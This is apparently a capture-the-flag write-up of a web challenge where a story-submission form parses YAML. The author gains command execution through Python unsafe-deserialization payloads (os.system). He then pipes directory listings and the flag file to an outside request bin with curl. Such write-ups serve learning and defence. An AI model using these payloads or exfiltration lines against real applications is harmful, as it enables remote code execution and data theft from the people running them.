We have to sign up and then log in to see a page with shared stories. When we
do we are greeted with a blog listing. At the bottom there is a button to add
our own story to the blog.

![Story time front page][story-time]  
![Story time yaml form][story-time-form]

We can try to send some malformed yaml to the page:

``` yml  
title: "Title of your story"  
synopsis: "This is a brief summary of your story"  
plot:  
---and they lived happily ever after.  
   The End  
keywords:  
   - "example"   
   - "fiction"   
```

```  
Bad Request

Error parsing yaml: while scanning a simple key  
in "<unicode string>", line 4, column 1:  
---and they lived happily ever a ...  
^  
could not find expected ':'  
in "<unicode string>", line 6, column 1:  
keywords:  
^  
```

Googling the errors didn't really give me any clues to which framework was
being used, so I decided to just try a few simple payloads.

My first payload was:

```yml  
!!python/object/apply:subprocess.Popen  
 - ls  
```  
Giving the error below, at least now we can be pretty sure we're dealing with
a python application.

```  
Internal Server Error

'Popen' object is not subscriptable  
```

I actually spent a lot of trying to get Popen to work, but found a different
payload after a while.

``` yml  
!!python/object/apply:os.system  
 - ls  
```  
It succeeds, but the data does not appear anywhere. We can easily exfiltrate
data though with a request bin though.

```yml  
!!python/object/apply:os.system  
 - ls | curl -X POST --data-binary @-  https://postb.in/1601157034473-5430747917853  
```

The flag is in the web directory, so we can just issue a new command:  
```yml

!!python/object/apply:os.system  
 - cat flag.txt | curl -X POST --data-binary @-  https://postb.in/1601157034473-5430747917853  
```

[story-time]: https://lorentzvedeler.com/assets/imgs/yaml-blog.png "Story time
front page"  
[story-time-form]: https://lorentzvedeler.com/assets/imgs/yaml-form.png "Story
time form"

Original writeup (https://lorentzvedeler.com/writeup/2020/09/26/bsidesbos-
web/).